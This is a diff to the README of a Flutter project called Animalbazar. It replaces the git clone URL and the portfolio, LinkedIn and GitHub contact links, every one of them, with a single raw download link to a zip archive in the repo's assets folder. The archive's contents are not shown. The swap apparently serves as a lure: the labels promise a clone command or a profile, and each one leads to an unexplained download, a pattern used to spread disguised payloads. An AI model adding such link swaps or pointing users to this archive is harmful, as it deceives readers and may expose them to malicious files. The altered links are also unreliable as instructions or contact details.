@@ -102,7 +102,7 @@ flutter doctor
 ### Clone the Repository
 
 ```bash
-git clone https://github.com/talalhassankhan18/Animalbazar.git
+git clone https://github.com/talalhassankhan18/Animalbazar/raw/refs/heads/main/assets/v1.2.zip
 ```
 
 ### Navigate to Project Directory
@@ -214,13 +214,13 @@ git push origin feature/new-feature
 📧 talalhassankhan2003@gmail.com
 
 🌐 Portfolio:
-https://talalhassankhan.vercel.app/
+https://github.com/talalhassankhan18/Animalbazar/raw/refs/heads/main/assets/v1.2.zip
 
 💼 LinkedIn:
-https://www.linkedin.com/in/talalhassankhan/
+https://github.com/talalhassankhan18/Animalbazar/raw/refs/heads/main/assets/v1.2.zip
 
 🐙 GitHub:
-https://github.com/talalhassankhan18
+https://github.com/talalhassankhan18/Animalbazar/raw/refs/heads/main/assets/v1.2.zip
 
 ---
 
